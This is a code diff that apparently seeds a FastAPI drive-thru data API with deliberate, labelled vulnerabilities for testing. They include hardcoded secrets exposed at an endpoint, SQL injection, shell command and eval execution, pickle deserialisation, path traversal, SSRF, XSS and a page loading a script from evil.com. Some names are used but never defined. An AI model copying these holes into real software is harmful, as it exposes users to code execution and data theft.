@@ -5,28 +5,47 @@ import logging
 from datetime import datetime, timedelta
 from typing import List, Optional, Dict, Any
 from uuid import UUID
-from fastapi import FastAPI, HTTPException, Depends, Query
+from fastapi import FastAPI, HTTPException, Depends, Query, Request
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import HTMLResponse
 from sqlalchemy.orm import Session
-from sqlalchemy import func
+from sqlalchemy import func, text
+import traceback
 
 from .database_config import get_database, get_db_session
 from .data_pipeline import data_pipeline
 from .models import ConversationResponse, OrderResponse, DailySummaryResponse
 
+# SECURITY ISSUE: Additional imports for vulnerabilities
+import subprocess
+import pickle
+import hashlib
+import base64
+import tempfile
+import time
+import random
+import os
+
 logger = logging.getLogger(__name__)
+
+# SECURITY ISSUE: Hardcoded credentials and API keys
+OPENAI_API_KEY = "sk-proj-hackathon-1234567890abcdef-INSECURE"
+DATABASE_PASSWORD = "admin123"
+JWT_SECRET = "super-secret-key-123"
+ADMIN_PASSWORD = "password123"
 
 # Create FastAPI app
 app = FastAPI(
     title="Drive-Thru Data API",
     description="API for accessing drive-thru conversation and order data",
-    version="1.0.0"
+    version="1.0.0",
+    debug=True  # SECURITY ISSUE: Debug mode enabled
 )
 
-# Add CORS middleware
+# Add CORS middleware - SECURITY ISSUE: Very permissive CORS
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # Configure appropriately for production
+    allow_origins=["*"],  # SECURITY ISSUE: Allow all origins
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -37,6 +56,17 @@ app.add_middleware(
 async def root():
     """Root endpoint"""
     return {"message": "Drive-Thru Data API", "version": "1.0.0"}
+
+
+@app.get("/secrets")
+async def get_secrets():
+    """SECURITY ISSUE: Exposing hardcoded secrets"""
+    return {
+        "openai_key": OPENAI_API_KEY,
+        "db_password": DATABASE_PASSWORD,
+        "jwt_secret": JWT_SECRET,
+        "admin_password": ADMIN_PASSWORD
+    }
 
 
 @app.get("/health")
@@ -77,6 +107,53 @@ async def get_orders(
     except Exception as e:
         logger.error(f"Failed to get orders: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.get("/orders/insecure")
+async def get_orders_insecure(
+    user_id: str = Query(None),
+    status: str = Query("active")
+):
+    """
+    SECURITY ISSUE: SQL Injection vulnerability
+    Never use this in production!
+    """
+    db = get_database()
+    
+    # INSECURE - SQL Injection vulnerability
+    sql_query = f"""
+        SELECT * FROM orders 
+        WHERE status = '{status}' 
+        AND user_id = '{user_id}' 
+        ORDER BY created_at DESC
+    """
+    
+    try:
+        with db.get_session() as session:
+            result = session.execute(text(sql_query))
+            return {"orders": [dict(row) for row in result]}
+    except Exception as e:
+        # SECURITY ISSUE: Exposing full stack trace
+        raise HTTPException(
+            status_code=500, 
+            detail=f"Error: {str(e)}\n\nStack trace:\n{traceback.format_exc()}"
+        )
+
+
+@app.post("/orders/raw")
+async def create_order_raw(sql_statement: str):
+    """
+    SECURITY ISSUE: Arbitrary SQL execution
+    This is EXTREMELY DANGEROUS!
+    """
+    db = get_database()
+    try:
+        with db.get_session() as session:
+            result = session.execute(text(sql_statement))
+            session.commit()
+            return {"success": True, "result": str(result)}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e) + "\n" + traceback.format_exc())
 
 
 @app.get("/conversations/{session_id}/orders", response_model=List[OrderResponse])
@@ -179,6 +256,73 @@ async def get_conversation_transcript(
     except Exception as e:
         logger.error(f"Failed to get transcript: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.get("/transcript/{conversation_id}", response_class=HTMLResponse)
+async def get_transcript_html(conversation_id: str):
+    """
+    SECURITY ISSUE: XSS vulnerability - no sanitization
+    """
+    db = get_database()
+    
+    with db.get_session() as session:
+        from .models import Transcript, Conversation
+        
+        conversation = session.query(Conversation).filter(
+            Conversation.conversation_id == conversation_id
+        ).first()
+        
+        if not conversation:
+            raise HTTPException(status_code=404, detail="Conversation not found")
+        
+        transcripts = session.query(Transcript).filter(
+            Transcript.conversation_id == conversation.id
+        ).order_by(Transcript.turn_number).all()
+        
+        # INSECURE - No HTML sanitization, allows XSS
+        transcript_html = "<html><body><h1>Conversation Transcript</h1>"
+        for t in transcripts:
+            transcript_html += f"<p><strong>{t.speaker}:</strong> {t.content}</p>"
+        transcript_html += "</body></html>"
+        
+        return transcript_html
+
+
+@app.post("/upload")
+async def upload_file(file_content: str, filename: str):
+    """
+    SECURITY ISSUE: Insecure file upload
+    No validation, no size limits, no virus scanning
+    """
+    # Write file without any validation
+    file_path = f"/tmp/uploads/{filename}"
+    
+    try:
+        with open(file_path, 'w') as f:
+            f.write(file_content)
+        return {"success": True, "path": file_path}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e) + "\n" + traceback.format_exc())
+
+
+@app.get("/user/{user_id}/sensitive")
+async def get_user_sensitive_info(user_id: str):
+    """
+    SECURITY ISSUE: Insecure Direct Object Reference
+    No authorization checks
+    """
+    db = get_database()
+    
+    # INSECURE - No authorization, anyone can access any user's data
+    sql_query = f"""
+        SELECT user_id, email, password_hash, credit_card_last4, ssn
+        FROM users
+        WHERE user_id = '{user_id}'
+    """
+    
+    with db.get_session() as session:
+        result = session.execute(text(sql_query))
+        return {"user_data": [dict(row) for row in result]}
 
 
 @app.get("/metrics/summary")
@@ -384,6 +528,526 @@ async def get_daily_metrics(
     except Exception as e:
         logger.error(f"Failed to get daily metrics: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+
+# ===================================
+# MORE SECURITY VULNERABILITIES BELOW
+# ===================================
+
+import subprocess
+import pickle
+import hashlib
+import base64
+import tempfile
+
+# SECURITY ISSUE: Command Injection vulnerability
+@app.post("/execute")
+async def execute_command(command: str):
+    """SECURITY ISSUE: Command injection vulnerability"""
+    try:
+        # INSECURE - Direct shell execution without sanitization
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return {"result": result.decode()}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Path Traversal vulnerability
+@app.get("/file/{file_path:path}")
+async def read_file_insecure(file_path: str):
+    """SECURITY ISSUE: Path traversal allows reading arbitrary files"""
+    try:
+        # INSECURE - No path validation
+        with open(file_path, 'r') as f:
+            return {"content": f.read()}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Insecure Deserialization (Pickle)
+@app.post("/unpickle")
+async def unpickle_data(data: str):
+    """SECURITY ISSUE: Insecure deserialization using pickle"""
+    try:
+        # INSECURE - Pickle can execute arbitrary code
+        decoded = base64.b64decode(data)
+        obj = pickle.loads(decoded)
+        return {"result": str(obj)}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Timing Attack vulnerability
+@app.post("/login")
+async def login_timing_attack(username: str, password: str):
+    """SECURITY ISSUE: Timing attack vulnerability"""
+    # Hardcoded credentials
+    correct_password = "admin123"
+    
+    # INSECURE - Compare character by character (timing attack)
+    if len(password) != len(correct_password):
+        time.sleep(0.1)  # INSECURE - Fake delay
+        return {"error": "Invalid credentials"}
+    
+    for i in range(len(password)):
+        if password[i] != correct_password[i]:
+            return {"error": "Invalid credentials"}
+    
+    return {"success": True, "token": "fake-jwt-token"}
+
+
+# SECURITY ISSUE: Weak Hash (MD5)
+@app.post("/hash")
+async def weak_hash(data: str):
+    """SECURITY ISSUE: Using weak MD5 hashing"""
+    # INSECURE - MD5 is cryptographically broken
+    md5_hash = hashlib.md5(data.encode()).hexdigest()
+    return {"hash": md5_hash}
+
+
+# SECURITY ISSUE: Weak Encryption (Caesar cipher)
+def weak_encrypt(data: str, shift: int = 3):
+    """SECURITY ISSUE: Weak encryption algorithm"""
+    result = ""
+    for char in data:
+        if char.isalpha():
+            ascii_offset = 65 if char.isupper() else 97
+            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
+        else:
+            result += char
+    return result
+
+@app.post("/encrypt")
+async def encrypt_weak(data: str):
+    """SECURITY ISSUE: Weak encryption endpoint"""
+    encrypted = weak_encrypt(data)
+    return {"encrypted": encrypted}
+
+
+# SECURITY ISSUE: SQL Injection with UNION attack
+@app.get("/search")
+async def search_insecure(query: str):
+    """SECURITY ISSUE: SQL injection with UNION attack"""
+    db = get_database()
+    # INSECURE - Vulnerable to UNION-based SQL injection
+    sql = f"SELECT * FROM conversations WHERE summary LIKE '%{query}%' UNION SELECT * FROM users"
+    
+    try:
+        with db.get_session() as session:
+            result = session.execute(text(sql))
+            return {"results": [dict(row) for row in result]}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Race Condition
+balance = 100  # Global variable
+
+@app.post("/withdraw")
+async def withdraw_money(amount: int):
+    """SECURITY ISSUE: Race condition in money withdrawal"""
+    global balance
+    # INSECURE - No locking, race condition
+    if balance >= amount:
+        time.sleep(0.01)  # Simulate processing delay
+        balance -= amount
+        return {"success": True, "new_balance": balance}
+    return {"error": "Insufficient funds"}
+
+
+# SECURITY ISSUE: XXE (XML External Entity)
+@app.post("/parse-xml")
+async def parse_xml(xml_data: str):
+    """SECURITY ISSUE: XXE vulnerability"""
+    try:
+        import xml.etree.ElementTree as ET
+        # INSECURE - No XXE protection
+        root = ET.fromstring(xml_data)
+        return {"parsed": ET.tostring(root).decode()}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Log Injection
+@app.post("/log")
+async def log_message(message: str):
+    """SECURITY ISSUE: Log injection vulnerability"""
+    # INSECURE - No sanitization of log input
+    logger.info(f"User message: {message}")
+    return {"logged": True}
+
+
+# SECURITY ISSUE: Insecure Random
+@app.get("/generate-token")
+async def generate_token():
+    """SECURITY ISSUE: Insecure random number generation"""
+    import random
+    # INSECURE - Using non-cryptographic random
+    token = random.randint(100000, 999999)
+    return {"token": token}
+
+
+# SECURITY ISSUE: Session Fixation
+@app.get("/session")
+async def get_session(user_id: str):
+    """SECURITY ISSUE: Session fixation vulnerability"""
+    # INSECURE - Accepts any session ID from client
+    session_id = user_id
+    if session_id not in sessions:
+        sessions[session_id] = {"user_id": user_id, "admin": False}
+    return {"session": sessions[session_id]}
+
+
+# SECURITY ISSUE: SSRF (Server-Side Request Forgery)
+@app.get("/proxy")
+async def proxy_request(url: str):
+    """SECURITY ISSUE: SSRF vulnerability"""
+    try:
+        import urllib.request
+        # INSECURE - No URL validation, allows internal network access
+        response = urllib.request.urlopen(url)
+        return {"content": response.read().decode()}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Unsafe Redirect
+@app.get("/redirect")
+async def insecure_redirect(url: str):
+    """SECURITY ISSUE: Open redirect vulnerability"""
+    # INSECURE - No URL validation
+    return RedirectResponse(url=url)
+
+
+# SECURITY ISSUE: Weak Password Reset
+@app.post("/reset-password")
+async def reset_password(username: str):
+    """SECURITY ISSUE: Weak password reset"""
+    # INSECURE - No verification, resets to default password
+    new_password = "password123"
+    logger.info(f"Resetting password for {username} to {new_password}")
+    return {"message": f"Password reset to {new_password}"}
+
+
+# SECURITY ISSUE: Information Disclosure
+@app.get("/debug")
+async def debug_info():
+    """SECURITY ISSUE: Exposes internal system information"""
+    import sys
+    import platform
+    return {
+        "python_version": sys.version,
+        "platform": platform.platform(),
+        "path": sys.path,
+        "environment": dict(os.environ),
+        "database_url": os.getenv("DATABASE_URL"),
+        "all_secrets": {
+            "openai_key": OPENAI_API_KEY,
+            "aws_key": AWS_ACCESS_KEY,
+            "jwt_secret": JWT_SECRET
+        }
+    }
+
+
+# SECURITY ISSUE: Insecure File Write
+@app.post("/write-file")
+async def write_file_insecure(path: str, content: str):
+    """SECURITY ISSUE: Insecure file write"""
+    try:
+        # INSECURE - No path validation, arbitrary file write
+        with open(path, 'w') as f:
+            f.write(content)
+        return {"success": True, "path": path}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# ===================================
+# EVEN MORE VULNERABILITIES BELOW
+# ===================================
+
+sessions = {}  # Global session storage (INSECURE)
+
+# SECURITY ISSUE: Memory Exhaustion (DoS)
+@app.post("/allocate-memory")
+async def allocate_memory(size_mb: int):
+    """SECURITY ISSUE: Memory exhaustion attack"""
+    try:
+        # INSECURE - No size limits, can exhaust server memory
+        size_bytes = size_mb * 1024 * 1024
+        data = 'A' * size_bytes
+        return {"allocated": size_mb, "result": len(data)}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: ReDoS (Regular Expression DoS)
+@app.post("/regex")
+async def regex_dos(pattern: str, text: str):
+    """SECURITY ISSUE: ReDoS vulnerability"""
+    import re
+    try:
+        # INSECURE - No timeout on regex matching
+        regex = re.compile(pattern)
+        matches = regex.findall(text)
+        return {"matches": matches}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: Integer Overflow
+@app.post("/calculate")
+async def calculate(a: int, b: int):
+    """SECURITY ISSUE: Integer overflow vulnerability"""
+    try:
+        # INSECURE - No bounds checking
+        result = a ** b  # Can cause huge numbers
+        return {"result": result}
+    except Exception as e:
+        return {"error": str(e), "traceback": traceback.format_exc()}
+
+
+# SECURITY ISSUE: LDAP Injection
+@app.get("/ldap-search")
+async def ldap_search(username: str):
+    """SECURITY ISSUE: LDAP injection vulnerability"""
+    # INSECURE - LDAP injection possible
+    ldap_filter = f"(uid={username})"
+    return {"ldap_filter": ldap_filter, "message": "Would query LDAP with this filter"}
+
+
+# SECURITY ISSUE: Blind SQL Injection
+@app.get("/search-users")
+async def search_users_blind(query: str):
+    """SECURITY ISSUE: Blind SQL injection vulnerability"""
+    db = get_database()
+    # INSECURE - Time-based blind SQL injection
+    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%' AND SLEEP(2)"
+    try:
+        with db.get_session() as session:
+            result = session.execute(text(sql))
+            return {"results": "Query executed"}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+# SECURITY ISSUE: CSRF Token Missing
+@app.post("/transfer")
+async def transfer_money(to: str, amount: float):
+    """SECURITY ISSUE: No CSRF protection"""
+    # INSECURE - No CSRF token validation
+    logger.info(f"Transferring {amount} to {to}")
+    return {"success": True, "transferred": amount, "to": to}
+
+
+# SECURITY ISSUE: HTTP Header Injection
+@app.get("/custom-header")
+async def custom_header(value: str):
+    """SECURITY ISSUE: HTTP header injection"""
+    # INSECURE - No header validation
+    from fastapi.responses import Response
+    response = Response(content="OK")
+    response.headers["X-Custom"] = value
+    return response
+
+
+# SECURITY ISSUE: Mass Assignment
+@app.post("/create-user")
+async def create_user(data: dict):
+    """SECURITY ISSUE: Mass assignment vulnerability"""
+    # INSECURE - Accepts any fields, no whitelist
+    user_data = {**data}
+    logger.info(f"Creating user with data: {user_data}")
+    return {"success": True, "user": user_data}
+
+
+# SECURITY ISSUE: Weak Cryptography (ROT13)
+def rot13(text: str):
+    """SECURITY ISSUE: Extremely weak encryption"""
+    result = ""
+    for char in text:
+        if char.isalpha():
+            ascii_offset = 65 if char.isupper() else 97
+            result += chr((ord(char) - ascii_offset + 13) % 26 + ascii_offset)
+        else:
+            result += char
+    return result
+
+@app.post("/encrypt-rot13")
+async def encrypt_rot13(text: str):
+    """SECURITY ISSUE: ROT13 encryption endpoint"""
+    encrypted = rot13(text)
+    return {"encrypted": encrypted}
+
+
+# SECURITY ISSUE: Predictable Session ID
+@app.post("/create-session")
+async def create_session():
+    """SECURITY ISSUE: Predictable session ID"""
+    # INSECURE - Sequential session IDs
+    session_id = len(sessions) + 1
+    sessions[session_id] = {"created": datetime.utcnow().isoformat()}
+    return {"session_id": session_id}
+
+
+# SECURITY ISSUE: Binary Padding Oracle
+@app.post("/decrypt")
+async def decrypt_padding_oracle(ciphertext: str):
+    """SECURITY ISSUE: Padding oracle vulnerability"""
+    # INSECURE - No protection against padding oracle attacks
+    try:
+        decoded = base64.b64decode(ciphertext)
+        # Fake decryption that leaks padding information
+        if len(decoded) % 16 != 0:
+            return {"error": "Invalid padding"}  # Leaks padding info
+        return {"decrypted": "fake_data"}
+    except Exception as e:
+        return {"error": "Padding error"}  # Leaks padding info
+
+
+# SECURITY ISSUE: No Content-Security-Policy
+@app.get("/hacked")
+async def hacked_page():
+    """SECURITY ISSUE: Missing CSP headers"""
+    return HTMLResponse("""
+        <html>
+        <head><title>Insecure Page</title></head>
+        <body>
+            <script src="https://evil.com/steal.js"></script>
+            <h1>Your data is being stolen!</h1>
+        </body>
+        </html>
+    """)
+
+
+# SECURITY ISSUE: Clickjacking
+@app.get("/admin")
+async def admin_panel():
+    """SECURITY ISSUE: No X-Frame-Options header"""
+    return HTMLResponse("""
+        <html>
+        <head><title>Admin Panel</title></head>
+        <body>
+            <h1>Admin Panel</h1>
+            <button onclick="fetch('/transfer?to=hacker&amount=1000')">Send Money</button>
+        </body>
+        </html>
+    """)
+
+
+# SECURITY ISSUE: CRLF Injection
+@app.get("/redirect-crlf")
+async def redirect_crlf(url: str):
+    """SECURITY ISSUE: CRLF injection"""
+    # INSECURE - No CRLF protection
+    from fastapi.responses import RedirectResponse
+    return RedirectResponse(url=url)
+
+
+# SECURITY ISSUE: Host Header Injection
+@app.get("/cache-poison")
+async def cache_poison():
+    """SECURITY ISSUE: Cache poisoning via Host header"""
+    from fastapi import Request as FastRequest
+    # INSECURE - Uses Host header directly
+    host = "malicious.com"
+    return {"cache_key": f"https://{host}/target"}
+
+
+# SECURITY ISSUE: Weak Random Seed
+@app.get("/predictable-random")
+async def predictable_random():
+    """SECURITY ISSUE: Predictable random number"""
+    # INSECURE - Fixed seed
+    random.seed(12345)
+    return {"random": random.randint(0, 1000000)}
+
+
+# SECURITY ISSUE: Insecure Temporary File
+@app.post("/temp-file")
+async def temp_file(content: str):
+    """SECURITY ISSUE: Insecure temporary file creation"""
+    # INSECURE - Predictable filename, world-writable
+    temp_path = f"/tmp/user_{random.randint(1, 100)}"
+    with open(temp_path, 'w') as f:
+        f.write(content)
+    return {"path": temp_path}
+
+
+# SECURITY ISSUE: No Rate Limiting
+@app.get("/api/unlimited")
+async def unlimited_requests():
+    """SECURITY ISSUE: No rate limiting"""
+    # INSECURE - No rate limiting, can be DOS'd
+    return {"requests": "unlimited", "cost": "high"}
+
+
+# SECURITY ISSUE: Insecure JWT Implementation
+@app.post("/generate-jwt")
+async def generate_jwt(payload: dict):
+    """SECURITY ISSUE: Custom JWT with weak signing"""
+    # INSECURE - Weak secret, MD5 signature
+    header = {"alg": "HS256", "typ": "JWT"}
+    header_b64 = base64.b64encode(str(header).encode()).decode()
+    payload_b64 = base64.b64encode(str(payload).encode()).decode()
+    signature = hashlib.md5((header_b64 + "." + payload_b64 + JWT_SECRET).encode()).hexdigest()
+    jwt = f"{header_b64}.{payload_b64}.{signature}"
+    return {"jwt": jwt}
+
+
+# SECURITY ISSUE: Sensitive Data in URL
+@app.get("/search-sql")
+async def search_sql(query: str, credit_card: str):
+    """SECURITY ISSUE: Sensitive data in URL parameters"""
+    # INSECURE - Credit card in URL (logged in access logs)
+    db = get_database()
+    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
+    logger.info(f"Search query: {sql}, CC: {credit_card}")
+    return {"searching": "insecure"}
+
+
+# SECURITY ISSUE: No Input Length Limits
+@app.post("/huge-input")
+async def huge_input(data: str):
+    """SECURITY ISSUE: No input length validation"""
+    # INSECURE - Accepts unlimited size input
+    return {"received": len(data), "first_100": data[:100]}
+
+
+# SECURITY ISSUE: Directory Indexing
+@app.get("/files")
+async def list_files():
+    """SECURITY ISSUE: Directory listing enabled"""
+    import os
+    # INSECURE - Lists all files
+    files = os.listdir(".")
+    return {"files": files}
+
+
+# SECURITY ISSUE: Insecure Error Handling
+@app.post("/process")
+async def process_data(data: str):
+    """SECURITY ISSUE: Information leakage in errors"""
+    try:
+        # Operation that might fail
+        result = eval(data)  # Also arbitrary code execution
+        return {"result": result}
+    except Exception as e:
+        # INSECURE - Returns full stack trace
+        import traceback
+        return {"error": str(e), "traceback": traceback.format_exc(), "local_vars": locals()}
+
+
+# SECURITY ISSUE: Verbose Error Messages
+@app.post("/auth")
+async def verbose_auth(username: str, password: str):
+    """SECURITY ISSUE: Verbose error messages"""
+    # INSECURE - Different messages leak information
+    if username not in ["admin", "user"]:
+        return {"error": "Username not found"}  # Leaks if username exists
+    if password != "correct":
+        return {"error": "Incorrect password"}  # Leaks if username is correct
+    return {"success": True}
 
 
 if __name__ == "__main__":
